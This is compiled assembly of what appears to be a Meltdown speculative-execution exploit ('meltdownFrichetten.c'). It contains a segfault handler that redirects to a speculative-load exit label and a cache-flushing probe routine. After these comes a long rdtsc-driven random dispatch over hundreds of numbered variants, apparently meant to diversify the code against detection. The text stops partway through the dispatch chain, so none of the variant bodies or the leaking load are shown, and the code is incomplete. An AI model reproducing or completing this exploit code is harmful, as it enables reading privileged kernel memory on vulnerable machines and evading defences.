	.file	"meltdownFrichetten.c"
	.text
	.type	sigaction_segv, @function
sigaction_segv:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -8(%rbp)
	leaq	__speculative_byte_load_exit(%rip), %rdx
	movq	-8(%rbp), %rax
	movq	%rdx, 168(%rax)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	sigaction_segv, .-sigaction_segv
	.globl	probe_one
	.type	probe_one, @function
probe_one:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$2424, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -2408(%rbp)
	movq	%rsi, -2416(%rbp)
	movl	%edx, -2420(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$5, -2376(%rbp)
	movl	$0, -2372(%rbp)
	movl	$0, -2384(%rbp)
	movl	$0, -2380(%rbp)
	movb	$0, -2393(%rbp)
	movq	$0, -2360(%rbp)
	leaq	-288(%rbp), %rax
	movl	$256, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2392(%rbp)
	jmp	.L3
.L13:
	leaq	-2336(%rbp), %rax
	movl	$2048, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2388(%rbp)
	jmp	.L4
.L5:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2352(%rbp)
	movq	-2352(%rbp), %rax
#APP
# 106 "meltdownFrichetten.c" 1
	mfence
	clflush	0(%rax)
# 0 "" 2
#NO_APP
	nop
	addl	$1, -2388(%rbp)
.L4:
	cmpl	$255, -2388(%rbp)
	jle	.L5
	movl	$0, %edx
	movl	$0, %esi
	movl	$-1, %edi
	call	read@PLT
	movq	-2408(%rbp), %rdx
	movq	-2416(%rbp), %rcx
#APP
# 158 "meltdownFrichetten.c" 1
	.global __speculative_byte_load_exit 
	92:                              
	xorq	%rax, %rax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$5000, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lprobe_one_win0_var0
	cmpl	$1, %eax
	je	.Lprobe_one_win0_var1
	cmpl	$2, %eax
	je	.Lprobe_one_win0_var2
	cmpl	$3, %eax
	je	.Lprobe_one_win0_var3
	cmpl	$4, %eax
	je	.Lprobe_one_win0_var4
	cmpl	$5, %eax
	je	.Lprobe_one_win0_var5
	cmpl	$6, %eax
	je	.Lprobe_one_win0_var6
	cmpl	$7, %eax
	je	.Lprobe_one_win0_var7
	cmpl	$8, %eax
	je	.Lprobe_one_win0_var8
	cmpl	$9, %eax
	je	.Lprobe_one_win0_var9
	cmpl	$10, %eax
	je	.Lprobe_one_win0_var10
	cmpl	$11, %eax
	je	.Lprobe_one_win0_var11
	cmpl	$12, %eax
	je	.Lprobe_one_win0_var12
	cmpl	$13, %eax
	je	.Lprobe_one_win0_var13
	cmpl	$14, %eax
	je	.Lprobe_one_win0_var14
	cmpl	$15, %eax
	je	.Lprobe_one_win0_var15
	cmpl	$16, %eax
	je	.Lprobe_one_win0_var16
	cmpl	$17, %eax
	je	.Lprobe_one_win0_var17
	cmpl	$18, %eax
	je	.Lprobe_one_win0_var18
	cmpl	$19, %eax
	je	.Lprobe_one_win0_var19
	cmpl	$20, %eax
	je	.Lprobe_one_win0_var20
	cmpl	$21, %eax
	je	.Lprobe_one_win0_var21
	cmpl	$22, %eax
	je	.Lprobe_one_win0_var22
	cmpl	$23, %eax
	je	.Lprobe_one_win0_var23
	cmpl	$24, %eax
	je	.Lprobe_one_win0_var24
	cmpl	$25, %eax
	je	.Lprobe_one_win0_var25
	cmpl	$26, %eax
	je	.Lprobe_one_win0_var26
	cmpl	$27, %eax
	je	.Lprobe_one_win0_var27
	cmpl	$28, %eax
	je	.Lprobe_one_win0_var28
	cmpl	$29, %eax
	je	.Lprobe_one_win0_var29
	cmpl	$30, %eax
	je	.Lprobe_one_win0_var30
	cmpl	$31, %eax
	je	.Lprobe_one_win0_var31
	cmpl	$32, %eax
	je	.Lprobe_one_win0_var32
	cmpl	$33, %eax
	je	.Lprobe_one_win0_var33
	cmpl	$34, %eax
	je	.Lprobe_one_win0_var34
	cmpl	$35, %eax
	je	.Lprobe_one_win0_var35
	cmpl	$36, %eax
	je	.Lprobe_one_win0_var36
	cmpl	$37, %eax
	je	.Lprobe_one_win0_var37
	cmpl	$38, %eax
	je	.Lprobe_one_win0_var38
	cmpl	$39, %eax
	je	.Lprobe_one_win0_var39
	cmpl	$40, %eax
	je	.Lprobe_one_win0_var40
	cmpl	$41, %eax
	je	.Lprobe_one_win0_var41
	cmpl	$42, %eax
	je	.Lprobe_one_win0_var42
	cmpl	$43, %eax
	je	.Lprobe_one_win0_var43
	cmpl	$44, %eax
	je	.Lprobe_one_win0_var44
	cmpl	$45, %eax
	je	.Lprobe_one_win0_var45
	cmpl	$46, %eax
	je	.Lprobe_one_win0_var46
	cmpl	$47, %eax
	je	.Lprobe_one_win0_var47
	cmpl	$48, %eax
	je	.Lprobe_one_win0_var48
	cmpl	$49, %eax
	je	.Lprobe_one_win0_var49
	cmpl	$50, %eax
	je	.Lprobe_one_win0_var50
	cmpl	$51, %eax
	je	.Lprobe_one_win0_var51
	cmpl	$52, %eax
	je	.Lprobe_one_win0_var52
	cmpl	$53, %eax
	je	.Lprobe_one_win0_var53
	cmpl	$54, %eax
	je	.Lprobe_one_win0_var54
	cmpl	$55, %eax
	je	.Lprobe_one_win0_var55
	cmpl	$56, %eax
	je	.Lprobe_one_win0_var56
	cmpl	$57, %eax
	je	.Lprobe_one_win0_var57
	cmpl	$58, %eax
	je	.Lprobe_one_win0_var58
	cmpl	$59, %eax
	je	.Lprobe_one_win0_var59
	cmpl	$60, %eax
	je	.Lprobe_one_win0_var60
	cmpl	$61, %eax
	je	.Lprobe_one_win0_var61
	cmpl	$62, %eax
	je	.Lprobe_one_win0_var62
	cmpl	$63, %eax
	je	.Lprobe_one_win0_var63
	cmpl	$64, %eax
	je	.Lprobe_one_win0_var64
	cmpl	$65, %eax
	je	.Lprobe_one_win0_var65
	cmpl	$66, %eax
	je	.Lprobe_one_win0_var66
	cmpl	$67, %eax
	je	.Lprobe_one_win0_var67
	cmpl	$68, %eax
	je	.Lprobe_one_win0_var68
	cmpl	$69, %eax
	je	.Lprobe_one_win0_var69
	cmpl	$70, %eax
	je	.Lprobe_one_win0_var70
	cmpl	$71, %eax
	je	.Lprobe_one_win0_var71
	cmpl	$72, %eax
	je	.Lprobe_one_win0_var72
	cmpl	$73, %eax
	je	.Lprobe_one_win0_var73
	cmpl	$74, %eax
	je	.Lprobe_one_win0_var74
	cmpl	$75, %eax
	je	.Lprobe_one_win0_var75
	cmpl	$76, %eax
	je	.Lprobe_one_win0_var76
	cmpl	$77, %eax
	je	.Lprobe_one_win0_var77
	cmpl	$78, %eax
	je	.Lprobe_one_win0_var78
	cmpl	$79, %eax
	je	.Lprobe_one_win0_var79
	cmpl	$80, %eax
	je	.Lprobe_one_win0_var80
	cmpl	$81, %eax
	je	.Lprobe_one_win0_var81
	cmpl	$82, %eax
	je	.Lprobe_one_win0_var82
	cmpl	$83, %eax
	je	.Lprobe_one_win0_var83
	cmpl	$84, %eax
	je	.Lprobe_one_win0_var84
	cmpl	$85, %eax
	je	.Lprobe_one_win0_var85
	cmpl	$86, %eax
	je	.Lprobe_one_win0_var86
	cmpl	$87, %eax
	je	.Lprobe_one_win0_var87
	cmpl	$88, %eax
	je	.Lprobe_one_win0_var88
	cmpl	$89, %eax
	je	.Lprobe_one_win0_var89
	cmpl	$90, %eax
	je	.Lprobe_one_win0_var90
	cmpl	$91, %eax
	je	.Lprobe_one_win0_var91
	cmpl	$92, %eax
	je	.Lprobe_one_win0_var92
	cmpl	$93, %eax
	je	.Lprobe_one_win0_var93
	cmpl	$94, %eax
	je	.Lprobe_one_win0_var94
	cmpl	$95, %eax
	je	.Lprobe_one_win0_var95
	cmpl	$96, %eax
	je	.Lprobe_one_win0_var96
	cmpl	$97, %eax
	je	.Lprobe_one_win0_var97
	cmpl	$98, %eax
	je	.Lprobe_one_win0_var98
	cmpl	$99, %eax
	je	.Lprobe_one_win0_var99
	cmpl	$100, %eax
	je	.Lprobe_one_win0_var100
	cmpl	$101, %eax
	je	.Lprobe_one_win0_var101
	cmpl	$102, %eax
	je	.Lprobe_one_win0_var102
	cmpl	$103, %eax
	je	.Lprobe_one_win0_var103
	cmpl	$104, %eax
	je	.Lprobe_one_win0_var104
	cmpl	$105, %eax
	je	.Lprobe_one_win0_var105
	cmpl	$106, %eax
	je	.Lprobe_one_win0_var106
	cmpl	$107, %eax
	je	.Lprobe_one_win0_var107
	cmpl	$108, %eax
	je	.Lprobe_one_win0_var108
	cmpl	$109, %eax
	je	.Lprobe_one_win0_var109
	cmpl	$110, %eax
	je	.Lprobe_one_win0_var110
	cmpl	$111, %eax
	je	.Lprobe_one_win0_var111
	cmpl	$112, %eax
	je	.Lprobe_one_win0_var112
	cmpl	$113, %eax
	je	.Lprobe_one_win0_var113
	cmpl	$114, %eax
	je	.Lprobe_one_win0_var114
	cmpl	$115, %eax
	je	.Lprobe_one_win0_var115
	cmpl	$116, %eax
	je	.Lprobe_one_win0_var116
	cmpl	$117, %eax
	je	.Lprobe_one_win0_var117
	cmpl	$118, %eax
	je	.Lprobe_one_win0_var118
	cmpl	$119, %eax
	je	.Lprobe_one_win0_var119
	cmpl	$120, %eax
	je	.Lprobe_one_win0_var120
	cmpl	$121, %eax
	je	.Lprobe_one_win0_var121
	cmpl	$122, %eax
	je	.Lprobe_one_win0_var122
	cmpl	$123, %eax
	je	.Lprobe_one_win0_var123
	cmpl	$124, %eax
	je	.Lprobe_one_win0_var124
	cmpl	$125, %eax
	je	.Lprobe_one_win0_var125
	cmpl	$126, %eax
	je	.Lprobe_one_win0_var126
	cmpl	$127, %eax
	je	.Lprobe_one_win0_var127
	cmpl	$128, %eax
	je	.Lprobe_one_win0_var128
	cmpl	$129, %eax
	je	.Lprobe_one_win0_var129
	cmpl	$130, %eax
	je	.Lprobe_one_win0_var130
	cmpl	$131, %eax
	je	.Lprobe_one_win0_var131
	cmpl	$132, %eax
	je	.Lprobe_one_win0_var132
	cmpl	$133, %eax
	je	.Lprobe_one_win0_var133
	cmpl	$134, %eax
	je	.Lprobe_one_win0_var134
	cmpl	$135, %eax
	je	.Lprobe_one_win0_var135
	cmpl	$136, %eax
	je	.Lprobe_one_win0_var136
	cmpl	$137, %eax
	je	.Lprobe_one_win0_var137
	cmpl	$138, %eax
	je	.Lprobe_one_win0_var138
	cmpl	$139, %eax
	je	.Lprobe_one_win0_var139
	cmpl	$140, %eax
	je	.Lprobe_one_win0_var140
	cmpl	$141, %eax
	je	.Lprobe_one_win0_var141
	cmpl	$142, %eax
	je	.Lprobe_one_win0_var142
	cmpl	$143, %eax
	je	.Lprobe_one_win0_var143
	cmpl	$144, %eax
	je	.Lprobe_one_win0_var144
	cmpl	$145, %eax
	je	.Lprobe_one_win0_var145
	cmpl	$146, %eax
	je	.Lprobe_one_win0_var146
	cmpl	$147, %eax
	je	.Lprobe_one_win0_var147
	cmpl	$148, %eax
	je	.Lprobe_one_win0_var148
	cmpl	$149, %eax
	je	.Lprobe_one_win0_var149
	cmpl	$150, %eax
	je	.Lprobe_one_win0_var150
	cmpl	$151, %eax
	je	.Lprobe_one_win0_var151
	cmpl	$152, %eax
	je	.Lprobe_one_win0_var152
	cmpl	$153, %eax
	je	.Lprobe_one_win0_var153
	cmpl	$154, %eax
	je	.Lprobe_one_win0_var154
	cmpl	$155, %eax
	je	.Lprobe_one_win0_var155
	cmpl	$156, %eax
	je	.Lprobe_one_win0_var156
	cmpl	$157, %eax
	je	.Lprobe_one_win0_var157
	cmpl	$158, %eax
	je	.Lprobe_one_win0_var158
	cmpl	$159, %eax
	je	.Lprobe_one_win0_var159
	cmpl	$160, %eax
	je	.Lprobe_one_win0_var160
	cmpl	$161, %eax
	je	.Lprobe_one_win0_var161
	cmpl	$162, %eax
	je	.Lprobe_one_win0_var162
	cmpl	$163, %eax
	je	.Lprobe_one_win0_var163
	cmpl	$164, %eax
	je	.Lprobe_one_win0_var164
	cmpl	$165, %eax
	je	.Lprobe_one_win0_var165
	cmpl	$166, %eax
	je	.Lprobe_one_win0_var166
	cmpl	$167, %eax
	je	.Lprobe_one_win0_var167
	cmpl	$168, %eax
	je	.Lprobe_one_win0_var168
	cmpl	$169, %eax
	je	.Lprobe_one_win0_var169
	cmpl	$170, %eax
	je	.Lprobe_one_win0_var170
	cmpl	$171, %eax
	je	.Lprobe_one_win0_var171
	cmpl	$172, %eax
	je	.Lprobe_one_win0_var172
	cmpl	$173, %eax
	je	.Lprobe_one_win0_var173
	cmpl	$174, %eax
	je	.Lprobe_one_win0_var174
	cmpl	$175, %eax
	je	.Lprobe_one_win0_var175
	cmpl	$176, %eax
	je	.Lprobe_one_win0_var176
	cmpl	$177, %eax
	je	.Lprobe_one_win0_var177
	cmpl	$178, %eax
	je	.Lprobe_one_win0_var178
	cmpl	$179, %eax
	je	.Lprobe_one_win0_var179
	cmpl	$180, %eax
	je	.Lprobe_one_win0_var180
	cmpl	$181, %eax
	je	.Lprobe_one_win0_var181
	cmpl	$182, %eax
	je	.Lprobe_one_win0_var182
	cmpl	$183, %eax
	je	.Lprobe_one_win0_var183
	cmpl	$184, %eax
	je	.Lprobe_one_win0_var184
	cmpl	$185, %eax
	je	.Lprobe_one_win0_var185
	cmpl	$186, %eax
	je	.Lprobe_one_win0_var186
	cmpl	$187, %eax
	je	.Lprobe_one_win0_var187
	cmpl	$188, %eax
	je	.Lprobe_one_win0_var188
	cmpl	$189, %eax
	je	.Lprobe_one_win0_var189
	cmpl	$190, %eax
	je	.Lprobe_one_win0_var190
	cmpl	$191, %eax
	je	.Lprobe_one_win0_var191
	cmpl	$192, %eax
	je	.Lprobe_one_win0_var192
	cmpl	$193, %eax
	je	.Lprobe_one_win0_var193
	cmpl	$194, %eax
	je	.Lprobe_one_win0_var194
	cmpl	$195, %eax
	je	.Lprobe_one_win0_var195
	cmpl	$196, %eax
	je	.Lprobe_one_win0_var196
	cmpl	$197, %eax
	je	.Lprobe_one_win0_var197
	cmpl	$198, %eax
	je	.Lprobe_one_win0_var198
	cmpl	$199, %eax
	je	.Lprobe_one_win0_var199
	cmpl	$200, %eax
	je	.Lprobe_one_win0_var200
	cmpl	$201, %eax
	je	.Lprobe_one_win0_var201
	cmpl	$202, %eax
	je	.Lprobe_one_win0_var202
	cmpl	$203, %eax
	je	.Lprobe_one_win0_var203
	cmpl	$204, %eax
	je	.Lprobe_one_win0_var204
	cmpl	$205, %eax
	je	.Lprobe_one_win0_var205
	cmpl	$206, %eax
	je	.Lprobe_one_win0_var206
	cmpl	$207, %eax
	je	.Lprobe_one_win0_var207
	cmpl	$208, %eax
	je	.Lprobe_one_win0_var208
	cmpl	$209, %eax
	je	.Lprobe_one_win0_var209
	cmpl	$210, %eax
	je	.Lprobe_one_win0_var210
	cmpl	$211, %eax
	je	.Lprobe_one_win0_var211
	cmpl	$212, %eax
	je	.Lprobe_one_win0_var212
	cmpl	$213, %eax
	je	.Lprobe_one_win0_var213
	cmpl	$214, %eax
	je	.Lprobe_one_win0_var214
	cmpl	$215, %eax
	je	.Lprobe_one_win0_var215
	cmpl	$216, %eax
	je	.Lprobe_one_win0_var216
	cmpl	$217, %eax
	je	.Lprobe_one_win0_var217
	cmpl	$218, %eax
	je	.Lprobe_one_win0_var218
	cmpl	$219, %eax
	je	.Lprobe_one_win0_var219
	cmpl	$220, %eax
	je	.Lprobe_one_win0_var220
	cmpl	$221, %eax
	je	.Lprobe_one_win0_var221
	cmpl	$222, %eax
	je	.Lprobe_one_win0_var222
	cmpl	$223, %eax
	je	.Lprobe_one_win0_var223
	cmpl	$224, %eax
	je	.Lprobe_one_win0_var224
	cmpl	$225, %eax
	je	.Lprobe_one_win0_var225
	cmpl	$226, %eax
	je	.Lprobe_one_win0_var226
	cmpl	$227, %eax
	je	.Lprobe_one_win0_var227
	cmpl	$228, %eax
	je	.Lprobe_one_win0_var228
	cmpl	$229, %eax
	je	.Lprobe_one_win0_var229
	cmpl	$230, %eax
	je	.Lprobe_one_win0_var230
	cmpl	$231, %eax
	je	.Lprobe_one_win0_var231
	cmpl	$232, %eax
	je	.Lprobe_one_win0_var232
	cmpl	$233, %eax
	je	.Lprobe_one_win0_var233
	cmpl	$234, %eax
	je	.Lprobe_one_win0_var234
	cmpl	$235, %eax
	je	.Lprobe_one_win0_var235
	cmpl	$236, %eax
	je	.Lprobe_one_win0_var236
	cmpl	$237, %eax
	je	.Lprobe_one_win0_var237
	cmpl	$238, %eax
	je	.Lprobe_one_win0_var238
	cmpl	$239, %eax
	je	.Lprobe_one_win0_var239
	cmpl	$240, %eax
	je	.Lprobe_one_win0_var240
	cmpl	$241, %eax
	je	.Lprobe_one_win0_var241
	cmpl	$242, %eax
	je	.Lprobe_one_win0_var242
	cmpl	$243, %eax
	je	.Lprobe_one_win0_var243
	cmpl	$244, %eax
	je	.Lprobe_one_win0_var244
	cmpl	$245, %eax
	je	.Lprobe_one_win0_var245
	cmpl	$246, %eax
	je	.Lprobe_one_win0_var246
	cmpl	$247, %eax
	je	.Lprobe_one_win0_var247
	cmpl	$248, %eax
	je	.Lprobe_one_win0_var248
	cmpl	$249, %eax
	je	.Lprobe_one_win0_var249
	cmpl	$250, %eax
	je	.Lprobe_one_win0_var250
	cmpl	$251, %eax
	je	.Lprobe_one_win0_var251
	cmpl	$252, %eax
	je	.Lprobe_one_win0_var252
	cmpl	$253, %eax
	je	.Lprobe_one_win0_var253
	cmpl	$254, %eax
	je	.Lprobe_one_win0_var254
	cmpl	$255, %eax
	je	.Lprobe_one_win0_var255
	cmpl	$256, %eax
	je	.Lprobe_one_win0_var256
	cmpl	$257, %eax
	je	.Lprobe_one_win0_var257
	cmpl	$258, %eax
	je	.Lprobe_one_win0_var258
	cmpl	$259, %eax
	je	.Lprobe_one_win0_var259
	cmpl	$260, %eax
	je	.Lprobe_one_win0_var260
	cmpl	$261, %eax
	je	.Lprobe_one_win0_var261
	cmpl	$262, %eax
	je	.Lprobe_one_win0_var262
	cmpl	$263, %eax
	je	.Lprobe_one_win0_var263
	cmpl	$264, %eax
	je	.Lprobe_one_win0_var264
	cmpl	$265, %eax
	je	.Lprobe_one_win0_var265
	cmpl	$266, %eax
	je	.Lprobe_one_win0_var266
	cmpl	$267, %eax
	je	.Lprobe_one_win0_var267
	cmpl	$268, %eax
	je	.Lprobe_one_win0_var268
	cmpl	$269, %eax
	je	.Lprobe_one_win0_var269
	cmpl	$270, %eax
	je	.Lprobe_one_win0_var270
	cmpl	$271, %eax
	je	.Lprobe_one_win0_var271
	cmpl	$272, %eax
	je	.Lprobe_one_win0_var272
	cmpl	$273, %eax
	je	.Lprobe_one_win0_var273
	cmpl	$274, %eax
	je	.Lprobe_one_win0_var274
	cmpl	$275, %eax
	je	.Lprobe_one_win0_var275
	cmpl	$276, %eax
	je	.Lprobe_one_win0_var276
	cmpl	$277, %eax
	je	.Lprobe_one_win0_var277
	cmpl	$278, %eax
	je	.Lprobe_one_win0_var278
	cmpl	$279, %eax
	je	.Lprobe_one_win0_var279
	cmpl	$280, %eax
	je	.Lprobe_one_win0_var280
	cmpl	$281, %eax
	je	.Lprobe_one_win0_var281
	cmpl	$282, %eax
	je	.Lprobe_one_win0_var282
	cmpl	$283, %eax
	je	.Lprobe_one_win0_var283
	cmpl	$284, %eax
	je	.Lprobe_one_win0_var284
	cmpl	$285, %eax
	je	.Lprobe_one_win0_var285
	cmpl	$286, %eax
	je	.Lprobe_one_win0_var286
	cmpl	$287, %eax
	je	.Lprobe_one_win0_var287
	cmpl	$288, %eax
	je	.Lprobe_one_win0_var288
	cmpl	$289, %eax
	je	.Lprobe_one_win0_var289
	cmpl	$290, %eax
	je	.Lprobe_one_win0_var290
	cmpl	$291, %eax
	je	.Lprobe_one_win0_var291
	cmpl	$292, %eax
	je	.Lprobe_one_win0_var292
	cmpl	$293, %eax
	je	.Lprobe_one_win0_var293
	cmpl	$294, %eax
	je	.Lprobe_one_win0_var294
	cmpl	$295, %eax
	je	.Lprobe_one_win0_var295
	cmpl	$296, %eax
	je	.Lprobe_one_win0_var296
	cmpl	$297, %eax
	je	.Lprobe_one_win0_var297
	cmpl	$298, %eax
	je	.Lprobe_one_win0_var298
	cmpl	$299, %eax
	je	.Lprobe_one_win0_var299
	cmpl	$300, %eax
	je	.Lprobe_one_win0_var300
	cmpl	$301, %eax
	je	.Lprobe_one_win0_var301
	cmpl	$302, %eax
	je	.Lprobe_one_win0_var302
	cmpl	$303, %eax
	je	.Lprobe_one_win0_var303
	cmpl	$304, %eax
	je	.Lprobe_one_win0_var304
	cmpl	$305, %eax
	je	.Lprobe_one_win0_var305
	cmpl	$306, %eax
	je	.Lprobe_one_win0_var306
	cmpl	$307, %eax
	je	.Lprobe_one_win0_var307
	cmpl	$308, %eax
	je	.Lprobe_one_win0_var308
	cmpl	$309, %eax
	je	.Lprobe_one_win0_var309
	cmpl	$310, %eax
	je	.Lprobe_one_win0_var310
	cmpl	$311, %eax
	je	.Lprobe_one_win0_var311
	cmpl	$312, %eax
	je	.Lprobe_one_win0_var312
	cmpl	$313, %eax
	je	.Lprobe_one_win0_var313
	cmpl	$314, %eax
	je	.Lprobe_one_win0_var314
	cmpl	$315, %eax
	je	.Lprobe_one_win0_var315
	cmpl	$316, %eax
	je	.Lprobe_one_win0_var316
	cmpl	$317, %eax
	je	.Lprobe_one_win0_var317
	cmpl	$318, %eax
	je	.Lprobe_one_win0_var318
	cmpl	$319, %eax
	je	.Lprobe_one_win0_var319
	cmpl	$320, %eax
	je	.Lprobe_one_win0_var320
	cmpl	$321, %eax
	je	.Lprobe_one_win0_var321
	cmpl	$322, %eax
	je	.Lprobe_one_win0_var322
	cmpl	$323, %eax
	je	.Lprobe_one_win0_var323
	cmpl	$324, %eax
	je	.Lprobe_one_win0_var324
	cmpl	$325, %eax
	je	.Lprobe_one_win0_var325
	cmpl	$326, %eax
	je	.Lprobe_one_win0_var326
	cmpl	$327, %eax
	je	.Lprobe_one_win0_var327
	cmpl	$328, %eax
	je	.Lprobe_one_win0_var328
	cmpl	$329, %eax
	je	.Lprobe_one_win0_var329
	cmpl	$330, %eax
	je	.Lprobe_one_win0_var330
	cmpl	$331, %eax
	je	.Lprobe_one_win0_var331
	cmpl	$332, %eax
	je	.Lprobe_one_win0_var332
	cmpl	$333, %eax
	je	.Lprobe_one_win0_var333
	cmpl	$334, %eax
	je	.Lprobe_one_win0_var334
	cmpl	$335, %eax
	je	.Lprobe_one_win0_var335
	cmpl	$336, %eax
	je	.Lprobe_one_win0_var336
	cmpl	$337, %eax
	je	.Lprobe_one_win0_var337
	cmpl	$338, %eax
	je	.Lprobe_one_win0_var338
	cmpl	$339, %eax
	je	.Lprobe_one_win0_var339
	cmpl	$340, %eax
	je	.Lprobe_one_win0_var340
	cmpl	$341, %eax
	je	.Lprobe_one_win0_var341
	cmpl	$342, %eax
	je	.Lprobe_one_win0_var342
	cmpl	$343, %eax
	je	.Lprobe_one_win0_var343
	cmpl	$344, %eax
	je	.Lprobe_one_win0_var344
	cmpl	$345, %eax
	je	.Lprobe_one_win0_var345
	cmpl	$346, %eax
	je	.Lprobe_one_win0_var346
	cmpl	$347, %eax
	je	.Lprobe_one_win0_var347
	cmpl	$348, %eax
	je	.Lprobe_one_win0_var348
	cmpl	$349, %eax
	je	.Lprobe_one_win0_var349
	cmpl	$350, %eax
	je	.Lprobe_one_win0_var350
	cmpl	$351, %eax
	je	.Lprobe_one_win0_var351
	cmpl	$352, %eax
	je	.Lprobe_one_win0_var352
	cmpl	$353, %eax
	je	.Lprobe_one_win0_var353
	cmpl	$354, %eax
	je	.Lprobe_one_win0_var354
	cmpl	$355, %eax
	je	.Lprobe_one_win0_var355
	cmpl	$356, %eax
	je	.Lprobe_one_win0_var356
	cmpl	$357, %eax
	je	.Lprobe_one_win0_var357
	cmpl	$358, %eax
	je	.Lprobe_one_win0_var358
	cmpl	$359, %eax
	je	.Lprobe_one_win0_var359
	cmpl	$360, %eax
	je	.Lprobe_one_win0_var360
	cmpl	$361, %eax
	je	.Lprobe_one_win0_var361
	cmpl	$362, %eax
	je	.Lprobe_one_win0_var362
	cmpl	$363, %eax
	je	.Lprobe_one_win0_var363
	cmpl	$364, %eax
	je	.Lprobe_one_win0_var364
	cmpl	$365, %eax
	je	.Lprobe_one_win0_var365
	cmpl	$366, %eax
	je	.Lprobe_one_win0_var366
	cmpl	$367, %eax
	je	.Lprobe_one_win0_var367
	cmpl	$368, %eax
	je	.Lprobe_one_win0_var368
	cmpl	$369, %eax
	je	.Lprobe_one_win0_var369
	cmpl	$370, %eax
	je	.Lprobe_one_win0_var370
	cmpl	$371, %eax
	je	.Lprobe_one_win0_var371
	cmpl	$372, %eax
	je	.Lprobe_one_win0_var372
	cmpl	$373, %eax
	je	.Lprobe_one_win0_var373
	cmpl	$374, %eax
	je	.Lprobe_one_win0_var374
	cmpl	$375, %eax
	je	.Lprobe_one_win0_var375
	cmpl	$376, %eax
	je	.Lprobe_one_win0_var376
	cmpl	$377, %eax
	je	.Lprobe_one_win0_var377
	cmpl	$378, %eax
	je	.Lprobe_one_win0_var378
	cmpl	$379, %eax
	je	.Lprobe_one_win0_var379
	cmpl	$380, %eax
	je	.Lprobe_one_win0_var380
	cmpl	$381, %eax
	je	.Lprobe_one_win0_var381
	cmpl	$382, %eax
	je	.Lprobe_one_win0_var382
	cmpl	$383, %eax
	je	.Lprobe_one_win0_var383
	cmpl	$384, %eax
	je	.Lprobe_one_win0_var384
	cmpl	$385, %eax
	je	.Lprobe_one_win0_var385
	cmpl	$386, %eax
	je	.Lprobe_one_win0_var386
	cmpl	$387, %eax
	je	.Lprobe_one_win0_var387
	cmpl	$388, %eax
	je	.Lprobe_one_win0_var388
	cmpl	$389, %eax
	je	.Lprobe_one_win0_var389
	cmpl	$390, %eax
	je	.Lprobe_one_win0_var390
	cmpl	$391, %eax
	je	.Lprobe_one_win0_var391
	cmpl	$392, %eax
	je	.Lprobe_one_win0_var392
	cmpl	$393, %eax
	je	.Lprobe_one_win0_var393
	cmpl	$394, %eax
	je	.Lprobe_one_win0_var394
	cmpl	$395, %eax
	je	.Lprobe_one_win0_var395
	cmpl	$396, %eax
	je	.Lprobe_one_win0_var396
	cmpl	$397, %eax
	je	.Lprobe_one_win0_var397
	cmpl	$398, %eax
	je	.Lprobe_one_win0_var398
	cmpl	$399, %eax
	je	.Lprobe_one_win0_var399
	cmpl	$400, %eax
	je	.Lprobe_one_win0_var400
	cmpl	$401, %eax
	je	.Lprobe_one_win0_var401
	cmpl	$402, %eax
	je	.Lprobe_one_win0_var402
	cmpl	$403, %eax
	je	.Lprobe_one_win0_var403
	cmpl	$404, %eax
	je	.Lprobe_one_win0_var404
	cmpl	$405, %eax
	je	.Lprobe_one_win0_var405
	cmpl	$406, %eax
	je	.Lprobe_one_win0_var406
	cmpl	$407, %eax
	je	.Lprobe_one_win0_var407
	cmpl	$408, %eax
	je	.Lprobe_one_win0_var408
	cmpl	$409, %eax
	je	.Lprobe_one_win0_var409
	cmpl	$410, %eax
	je	.Lprobe_one_win0_var410
	cmpl	$411, %eax
	je	.Lprobe_one_win0_var411
	cmpl	$412, %eax
	je	.Lprobe_one_win0_var412
	cmpl	$413, %eax
	je	.Lprobe_one_win0_var413
	cmpl	$414, %eax
	je	.Lprobe_one_win0_var414
	cmpl	$415, %eax
	je	.Lprobe_one_win0_var415
	cmpl	$416, %eax
	je	.Lprobe_one_win0_var416
	cmpl	$417, %eax
	je	.Lprobe_one_win0_var417
	cmpl	$418, %eax
	je	.Lprobe_one_win0_var418
	cmpl	$419, %eax
	je	.Lprobe_one_win0_var419
	cmpl	$420, %eax
	je	.Lprobe_one_win0_var420
	cmpl	$421, %eax
	je	.Lprobe_one_win0_var421
	cmpl	$422, %eax
	je	.Lprobe_one_win0_var422
	cmpl	$423, %eax
	je	.Lprobe_one_win0_var423
	cmpl	$424, %eax
	je	.Lprobe_one_win0_var424
	cmpl	$425, %eax
	je	.Lprobe_one_win0_var425
	cmpl	$426, %eax
	je	.Lprobe_one_win0_var426
	cmpl	$427, %eax
	je	.Lprobe_one_win0_var427
	cmpl	$428, %eax
	je	.Lprobe_one_win0_var428
	cmpl	$429, %eax
	je	.Lprobe_one_win0_var429
	cmpl	$430, %eax
	je	.Lprobe_one_win0_var430
	cmpl	$431, %eax
	je	.Lprobe_one_win0_var431
	cmpl	$432, %eax
	je	.Lprobe_one_win0_var432
	cmpl	$433, %eax
	je	.Lprobe_one_win0_var433
	cmpl	$434, %eax
	je	.Lprobe_one_win0_var434
	cmpl	$435, %eax
	je	.Lprobe_one_win0_var435
	cmpl	$436, %eax
	je	.Lprobe_one_win0_var436
	cmpl	$437, %eax
	je	.Lprobe_one_win0_var437
